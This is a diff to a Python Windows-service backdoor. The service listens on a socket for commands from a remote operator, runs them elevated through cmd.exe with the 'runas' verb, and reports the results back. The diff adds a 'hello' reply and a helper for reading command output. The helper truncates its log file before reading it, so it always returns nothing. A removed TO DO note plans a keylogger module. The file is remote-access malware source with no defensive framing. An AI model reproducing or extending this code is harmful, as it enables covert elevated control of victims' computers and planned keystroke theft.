@@ -53,22 +53,21 @@ class Main(service.WinService):
         while True:
             received_command = self.s.recv(1024 * 4).decode()
             self.handle_command(received_command)
-            # try:
-            #     self.execute_admin_cmd(received_command)
-            #     s.send("Successfully executed".encode())
-            # except:
-            #     s.send("An error has occurred".encode())
 
     def handle_command(self, command):
         if command == "start shell":
             self.s.send(f"{os.getcwd()} >> ".encode())
+        elif command == "hello":
+            self.s.send("hello")
         elif command[:2] == "cd":
             os.chdir(command[3:])
             self.s.send(f"{os.getcwd()} >> ".encode())
         else:
             try:
                 self.execute_admin_cmd(command)
-                self.s.send(f"Successfully executed\n{os.getcwd()} >> ".encode())
+                # cmd_output = self.get_cmd_output()
+                cmd_output = ""
+                self.s.send(f"{cmd_output}\nSuccessfully executed\n{os.getcwd()} >> ".encode())
             except Exception as error:
                 self.s.send(f"Error: {error}\n{os.getcwd()} >> ".encode())
 
@@ -97,6 +96,13 @@ class Main(service.WinService):
         shell.ShellExecuteEx(lpVerb="runas", lpFile="cmd.exe",
                              lpParameters=fr"/c {command} > {self.commands_log_filepath}")
 
+    def get_cmd_output(self):
+        output = ""
+        with open(self.commands_log_filepath, "w+") as f:
+            output = f.read()
+            f.write("")
+        return output
+
     def main(self):
         self.run_backdoor()
 
@@ -113,11 +119,3 @@ if __name__ == '__main__':
     else:
         Main.parse_command_line()
 
-"""
-TO DO:
-backdoor interface
-module loading
-user-friendly cli
-
-keylogger (as module)
-"""
